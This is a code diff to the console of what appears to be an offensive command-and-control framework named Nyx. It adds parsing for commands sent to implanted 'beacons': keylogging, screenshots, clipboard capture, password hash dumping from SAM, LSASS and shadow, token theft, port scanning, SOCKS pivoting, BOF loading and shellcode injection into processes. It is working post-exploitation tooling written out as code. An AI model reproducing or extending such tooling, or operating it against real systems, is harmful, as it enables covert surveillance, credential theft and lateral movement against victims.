@@ -2161,6 +2161,187 @@ impl MatchEvent for App {
             let cmd = raw.trim().to_string();
             if !cmd.is_empty() {
                 self.ui.text_input(cx, ids!(cmd_input)).set_text(cx, "");
+                let parts: Vec<&str> = cmd.split_whitespace().collect();
+                let first = parts.first().copied().unwrap_or("");
+
+                // ── Layer 1: local-only commands (no bridge, no session) ─────────
+                // Help, screen clear, session selection — these mutate local UI
+                // state only and bypass the network entirely.
+                match first {
+                    "help" | "?" => {
+                        LOG_LINES.write().unwrap().push("=== Nyx GUI console ===".into());
+                        LOG_LINES.write().unwrap().push("Local:      help clear use <id|prefix> info".into());
+                        LOG_LINES.write().unwrap().push("Global:     profile sessions refresh".into());
+                        LOG_LINES.write().unwrap().push("            creds [reveal|add|del] audit [verify]".into());
+                        LOG_LINES.write().unwrap().push("            tasks <id-prefix>".into());
+                        LOG_LINES.write().unwrap().push("Beacon:     ping sleep <s> [<jitter%>] exit".into());
+                        LOG_LINES.write().unwrap().push("Files:      ls upload <path> download <path>".into());
+                        LOG_LINES.write().unwrap().push("            cd|mkdir|rm|mv|cp <path> [dest]".into());
+                        LOG_LINES.write().unwrap().push("Recon:      ps env <name> driveinfo net <q>".into());
+                        LOG_LINES.write().unwrap().push("            portscan <host> <ports>".into());
+                        LOG_LINES.write().unwrap().push("Media:      screenshot [monitor] screenwatch <s>".into());
+                        LOG_LINES.write().unwrap().push("            clipboard keylog start|stop|dump".into());
+                        LOG_LINES.write().unwrap().push("Creds:      hashdump sam|system|lsass|shadow".into());
+                        LOG_LINES.write().unwrap().push("Tokens:     getuid steal <pid> make_token <DOMAIN\\user> <pwd> [type]".into());
+                        LOG_LINES.write().unwrap().push("            rev2self".into());
+                        LOG_LINES.write().unwrap().push("Pivot:      connect <host> <port> chan close <id> socks ...".into());
+                        LOG_LINES.write().unwrap().push("Payloads:   bof <name> <args> [path.o] inject <method> <pid> <sc_hex>".into());
+                        self.ui.redraw(cx);
+                        return;
+                    }
+                    "clear" => {
+                        LOG_LINES.write().unwrap().clear();
+                        self.ui.redraw(cx);
+                        return;
+                    }
+                    "use" => {
+                        // /use <id-or-prefix> — match against the currently-loaded
+                        // session list by id prefix. No network round-trip.
+                        let target = parts.get(1).copied().unwrap_or("");
+                        let sessions = SESSIONS.read().unwrap();
+                        match sessions.iter().position(|s| s.id.starts_with(target)) {
+                            Some(idx) => {
+                                SELECTED_SESSION.store(idx, std::sync::atomic::Ordering::Relaxed);
+                                LOG_LINES.write().unwrap().push(
+                                    format!("selected: {} ({})", &sessions[idx].id[..sessions[idx].id.len().min(8)], sessions[idx].hostname)
+                                );
+                            }
+                            None => {
+                                LOG_LINES.write().unwrap().push(
+                                    format!("! no session matching '{target}' (have {} loaded)", sessions.len())
+                                );
+                            }
+                        }
+                        drop(sessions);
+                        self.ui.redraw(cx);
+                        return;
+                    }
+                    "info" => {
+                        // /info — dump SessionView fields of the selected beacon.
+                        // Mirrors TUI's overlay; data already lives in SESSIONS so
+                        // this is a pure-local read.
+                        let sel = SELECTED_SESSION.load(std::sync::atomic::Ordering::Relaxed);
+                        let sessions = SESSIONS.read().unwrap();
+                        match sessions.get(sel) {
+                            Some(s) => {
+                                LOG_LINES.write().unwrap().push(format!("=== {} ===", s.id));
+                                LOG_LINES.write().unwrap().push(format!("  hostname: {}", s.hostname));
+                                LOG_LINES.write().unwrap().push(format!("  user:     {}", s.username));
+                                LOG_LINES.write().unwrap().push(format!("  os:       {} ({}-bit)", s.os, if s.arch == 86 { "x86" } else { "x64" }));
+                                LOG_LINES.write().unwrap().push(format!("  pid:      {}", s.pid));
+                                LOG_LINES.write().unwrap().push(format!("  admin:    {}", if s.is_admin != 0 { "yes" } else { "no" }));
+                                LOG_LINES.write().unwrap().push(format!("  pending:  {}", s.pending));
+                                LOG_LINES.write().unwrap().push(format!("  ja3:      {}", s.ja3.as_deref().unwrap_or("-")));
+                                LOG_LINES.write().unwrap().push(format!("  ja4:      {}", s.ja4.as_deref().unwrap_or("-")));
+                            }
+                            None => { LOG_LINES.write().unwrap().push("! no beacon selected — use /use <id> first".into()); }
+                        }
+                        drop(sessions);
+                        self.ui.redraw(cx);
+                        return;
+                    }
+                    _ => {}
+                }
+
+                // ── Layer 2: global commands (bridge, but no session required) ─
+                // Server-control-API surface: profile metadata, audit log, cred
+                // vault, session list refresh. Mirrors TUI's command surface for
+                // the same endpoints.
+                match first {
+                    "sessions" => {
+                        // /sessions [refresh] — currently only refresh is wired;
+                        // the worker already polls every 2s so this forces a
+                        // bypass of the change-detection signature.
+                        self.ensure_bridge();
+                        if let Some(b) = &self.bridge {
+                            let _ = b.from_ui.send(Cmd::RefreshSessions);
+                        }
+                        return;
+                    }
+                    "profile" => {
+                        self.ensure_bridge();
+                        if let Some(b) = &self.bridge {
+                            let _ = b.from_ui.send(Cmd::FetchProfile);
+                        }
+                        return;
+                    }
+                    "tasks" => {
+                        // /tasks <id-or-prefix> — fall back to selected if no arg.
+                        let target = parts.get(1).copied().unwrap_or("");
+                        let session_id = if !target.is_empty() {
+                            SESSIONS.read().unwrap().iter().find(|s| s.id.starts_with(target)).map(|s| s.id.clone())
+                        } else {
+                            let sel = SELECTED_SESSION.load(std::sync::atomic::Ordering::Relaxed);
+                            SESSIONS.read().unwrap().get(sel).map(|s| s.id.clone())
+                        };
+                        match session_id {
+                            Some(sid) => {
+                                self.ensure_bridge();
+                                if let Some(b) = &self.bridge {
+                                    let _ = b.from_ui.send(Cmd::FetchTasks { session: sid });
+                                }
+                            }
+                            None => { LOG_LINES.write().unwrap().push("! /tasks: no beacon selected and no target id given".into()); }
+                        }
+                        return;
+                    }
+                    "creds" => {
+                        // /creds [reveal]  |  /creds add DOMAIN\user kind secret
+                        //                  |  /creds del DOMAIN\user kind
+                        self.ensure_bridge();
+                        if let Some(b) = &self.bridge {
+                            if parts.iter().any(|p| *p == "add") {
+                                let principal = parts.get(2).copied().unwrap_or("");
+                                let kind = parts.get(3).copied().unwrap_or("password");
+                                let secret = parts.get(4).copied().unwrap_or("");
+                                let (realm, user) = match principal.split_once('\\') {
+                                    Some((r, u)) => (r.to_string(), u.to_string()),
+                                    None => (String::new(), principal.to_string()),
+                                };
+                                let _ = b.from_ui.send(Cmd::CredAdd { realm, user, kind: kind.to_string(), secret: secret.to_string() });
+                            } else if parts.iter().any(|p| *p == "del" || *p == "delete") {
+                                let principal = parts.get(2).copied().unwrap_or("");
+                                let kind = parts.get(3).copied().unwrap_or("password");
+                                let (realm, user) = match principal.split_once('\\') {
+                                    Some((r, u)) => (r.to_string(), u.to_string()),
+                                    None => (String::new(), principal.to_string()),
+                                };
+                                let _ = b.from_ui.send(Cmd::CredDelete { realm, user, kind: kind.to_string() });
+                            } else {
+                                let reveal = parts.iter().any(|p| *p == "reveal");
+                                let _ = b.from_ui.send(Cmd::FetchCreds { reveal });
+                            }
+                        }
+                        return;
+                    }
+                    "audit" => {
+                        // /audit [verify]  |  /audit [operator <n>] [action <a>] [limit <n>]
+                        self.ensure_bridge();
+                        if let Some(b) = &self.bridge {
+                            if parts.iter().any(|p| *p == "verify") {
+                                let _ = b.from_ui.send(Cmd::FetchAuditVerify);
+                            } else {
+                                let mut operator = None;
+                                let mut action = None;
+                                let mut limit = None;
+                                let mut it = parts[1..].iter();
+                                while let Some(&k) = it.next() {
+                                    match k {
+                                        "operator" => operator = it.next().map(|s| s.to_string()),
+                                        "action" => action = it.next().map(|s| s.to_string()),
+                                        "limit" => limit = it.next().and_then(|s| s.parse::<u32>().ok()),
+                                        _ => {}
+                                    }
+                                }
+                                let _ = b.from_ui.send(Cmd::FetchAudit { operator, action, limit });
+                            }
+                        }
+                        return;
+                    }
+                    _ => {}
+                }
+
+                // ── Layer 3: session-bound commands (require SELECTED_SESSION) ─
                 let sel = SELECTED_SESSION.load(std::sync::atomic::Ordering::Relaxed);
                 if sel != usize::MAX {
                     let session_id = SESSIONS.read().unwrap().get(sel).map(|s| s.id.clone());
@@ -2168,41 +2349,40 @@ impl MatchEvent for App {
                         CONSOLE.write().unwrap().entry(sid.clone()).or_default().push(format!("$ {}", cmd));
                         self.ensure_bridge();
                         if let Some(b) = &self.bridge {
-                            let parts: Vec<&str> = cmd.split_whitespace().collect();
-                            let bridge_cmd = match parts.first().copied() {
-                                Some("ping") => Cmd::Ping { session: sid.clone() },
-                                Some("sleep") => {
+                            let bridge_cmd = match first {
+                                "ping" => Cmd::Ping { session: sid.clone() },
+                                "sleep" => {
                                     let secs = parts.get(1).and_then(|s| s.parse().ok()).unwrap_or(60);
                                     let jitter = parts.get(2).and_then(|s| s.parse().ok()).unwrap_or(0);
                                     Cmd::Sleep { session: sid.clone(), seconds: secs, jitter_pct: jitter }
                                 }
-                                Some("exit") => Cmd::Exit { session: sid.clone() },
-                                Some("upload") => {
+                                "exit" => Cmd::Exit { session: sid.clone() },
+                                "upload" => {
                                     let name = parts.get(1).copied().unwrap_or("").to_string();
                                     // Local file reading should ideally be async, but for now we read it here
                                     // Alternatively, we just send empty data if file not found, which will fail gracefully
                                     let data_hex = if let Ok(data) = std::fs::read(&name) { hex::encode(data) } else { String::new() };
                                     Cmd::Upload { session: sid.clone(), name, data_hex }
                                 }
-                                Some("download") => Cmd::Download { session: sid.clone(), path: parts.get(1).copied().unwrap_or("").to_string() },
-                                Some("cd") | Some("mkdir") | Some("rm") => {
+                                "download" => Cmd::Download { session: sid.clone(), path: parts.get(1).copied().unwrap_or("").to_string() },
+                                "cd" | "mkdir" | "rm" => {
                                     Cmd::FileOp { session: sid.clone(), op: parts[0].to_string(), path: parts.get(1).copied().unwrap_or("").to_string(), dest: None }
                                 }
-                                Some("mv") | Some("cp") => {
+                                "mv" | "cp" => {
                                     Cmd::FileOp { session: sid.clone(), op: parts[0].to_string(), path: parts.get(1).copied().unwrap_or("").to_string(), dest: parts.get(2).map(|s| s.to_string()) }
                                 }
-                                Some("ls") => Cmd::Ls { session: sid.clone(), args: cmd.clone() },
-                                Some("ps") => Cmd::Ps { session: sid.clone(), args: cmd.clone() },
-                                Some("screenshot") => Cmd::Screenshot { session: sid.clone(), monitor: parts.get(1).and_then(|s| s.parse().ok()).unwrap_or(0) },
-                                Some("screenwatch") => Cmd::Screenwatch { session: sid.clone(), interval_secs: parts.get(1).and_then(|s| s.parse().ok()).unwrap_or(5) },
-                                Some("clipboard") => Cmd::Clipboard { session: sid.clone() },
-                                Some("env") => Cmd::Env { session: sid.clone(), name: parts.get(1).copied().unwrap_or("").to_string() },
-                                Some("keylog") => {
+                                "ls" => Cmd::Ls { session: sid.clone(), args: cmd.clone() },
+                                "ps" => Cmd::Ps { session: sid.clone(), args: cmd.clone() },
+                                "screenshot" => Cmd::Screenshot { session: sid.clone(), monitor: parts.get(1).and_then(|s| s.parse().ok()).unwrap_or(0) },
+                                "screenwatch" => Cmd::Screenwatch { session: sid.clone(), interval_secs: parts.get(1).and_then(|s| s.parse().ok()).unwrap_or(5) },
+                                "clipboard" => Cmd::Clipboard { session: sid.clone() },
+                                "env" => Cmd::Env { session: sid.clone(), name: parts.get(1).copied().unwrap_or("").to_string() },
+                                "keylog" => {
                                     let action_str = parts.get(1).copied().unwrap_or("start");
                                     let action = match action_str { "start" => 0, "stop" => 1, "dump" => 2, _ => 0 };
                                     Cmd::Keylog { session: sid.clone(), action }
                                 }
-                                Some("hashdump") => {
+                                "hashdump" => {
                                     // 统一语义：sam=0 system=1 lsass=2(deferred) shadow=3
                                     let method_str = parts.get(1).copied().unwrap_or("sam");
                                     let method = match method_str {
@@ -2214,13 +2394,13 @@ impl MatchEvent for App {
                                     };
                                     Cmd::Hashdump { session: sid.clone(), method }
                                 }
-                                Some("getuid") => Cmd::GetUid { session: sid.clone() },
-                                Some("steal") => Cmd::StealToken {
+                                "getuid" => Cmd::GetUid { session: sid.clone() },
+                                "steal" => Cmd::StealToken {
                                     session: sid.clone(),
                                     pid: parts.get(1).and_then(|s| s.parse().ok()).unwrap_or(0),
                                 },
-                                Some("rev2self") => Cmd::Rev2Self { session: sid.clone() },
-                                Some("make_token") => {
+                                "rev2self" => Cmd::Rev2Self { session: sid.clone() },
+                                "make_token" => {
                                     // make_token DOMAIN\user password [1|2|3]
                                     let du = parts.get(1).copied().unwrap_or("");
                                     let (domain, user) = match du.split_once('\\') {
@@ -2231,12 +2411,12 @@ impl MatchEvent for App {
                                     let logon_type = parts.get(3).and_then(|s| s.parse().ok()).unwrap_or(1);
                                     Cmd::MakeToken { session: sid.clone(), domain, user, password, logon_type }
                                 }
-                                Some("creds") => {
+                                "creds" => {
                                     // creds [reveal] — pull server credential store
                                     let reveal = parts.iter().any(|p| *p == "reveal");
                                     Cmd::FetchCreds { reveal }
                                 }
-                                Some("audit") => {
+                                "audit" => {
                                     // audit [operator <n>] [action <a>] [limit <n>]
                                     let mut operator = None;
                                     let mut action = None;
@@ -2252,17 +2432,59 @@ impl MatchEvent for App {
                                     }
                                     Cmd::FetchAudit { operator, action, limit }
                                 }
-                                Some("driveinfo") => Cmd::Driveinfo { session: sid.clone() },
-                                Some("portscan") => Cmd::Portscan { session: sid.clone(), host: parts.get(1).copied().unwrap_or("").to_string(), ports: parts.get(2).copied().unwrap_or("").to_string() },
-                                Some("net") => Cmd::Net { session: sid.clone(), query: parts.get(1).copied().unwrap_or("").to_string() },
-                                Some("connect") => Cmd::ConnectChan { session: sid.clone(), host: parts.get(1).copied().unwrap_or("").to_string(), port: parts.get(2).and_then(|s| s.parse().ok()).unwrap_or(0) },
-                                Some("socks") => {
+                                "driveinfo" => Cmd::Driveinfo { session: sid.clone() },
+                                "portscan" => Cmd::Portscan { session: sid.clone(), host: parts.get(1).copied().unwrap_or("").to_string(), ports: parts.get(2).copied().unwrap_or("").to_string() },
+                                "net" => Cmd::Net { session: sid.clone(), query: parts.get(1).copied().unwrap_or("").to_string() },
+                                "connect" => Cmd::ConnectChan { session: sid.clone(), host: parts.get(1).copied().unwrap_or("").to_string(), port: parts.get(2).and_then(|s| s.parse().ok()).unwrap_or(0) },
+                                "socks" => {
                                     let chan = parts.get(1).and_then(|s| s.parse().ok()).unwrap_or(0);
                                     let op_str = parts.get(2).copied().unwrap_or("start");
                                     let op = match op_str { "start" => 0, "stop" => 1, _ => 0 };
                                     let addr = parts.get(3).copied().unwrap_or("").to_string();
                                     let port = parts.get(4).and_then(|s| s.parse().ok()).unwrap_or(0);
                                     Cmd::Socks { session: sid.clone(), chan, op, addr, port }
+                                }
+                                "bof" => {
+                                    // /bof <name> <args...> [path.o]
+                                    // Console-side counterpart to the BOF Run button.
+                                    // The local-file → hex load happens here so the
+                                    // bridge sends real bytes (empty path → empty hex,
+                                    // the implant handles that case gracefully).
+                                    let name = parts.get(1).copied().unwrap_or("").to_string();
+                                    let mut args_parts: Vec<&str> = parts.get(2..).unwrap_or(&[]).to_vec();
+                                    let mut data_hex = String::new();
+                                    if let Some(last) = args_parts.last() {
+                                        let candidate = last.to_string();
+                                        if std::path::Path::new(&candidate).exists() {
+                                            data_hex = std::fs::read(&candidate).map(hex::encode).unwrap_or_default();
+                                            args_parts.pop();
+                                        }
+                                    }
+                                    Cmd::Bof {
+                                        session: sid.clone(),
+                                        name,
+                                        args: args_parts.join(" "),
+                                        data_hex,
+                                    }
+                                }
+                                "inject" => {
+                                    // /inject <method> <pid> [<spawn_to>] <sc_hex>
+                                    let method = parts.get(1).and_then(|s| s.parse().ok()).unwrap_or(1u8);
+                                    let pid = parts.get(2).and_then(|s| s.parse().ok()).unwrap_or(0u32);
+                                    let spawn_to = parts.get(3).copied().unwrap_or("").to_string();
+                                    let sc_hex = parts.get(4).copied().unwrap_or("").to_string();
+                                    Cmd::Inject { session: sid.clone(), method, pid, spawn_to, sc_hex }
+                                }
+                                "chan" => {
+                                    // /chan close <id> — closes a pivot/SOCKS channel.
+                                    let sub = parts.get(1).copied().unwrap_or("");
+                                    match sub {
+                                        "close" => {
+                                            let chan = parts.get(2).and_then(|s| s.parse().ok()).unwrap_or(0);
+                                            Cmd::ChannelClose { session: sid.clone(), chan }
+                                        }
+                                        _ => Cmd::Shell { session: sid.clone(), args: cmd.clone() },
+                                    }
                                 }
                                 _ => Cmd::Shell { session: sid.clone(), args: cmd.clone() },
                             };
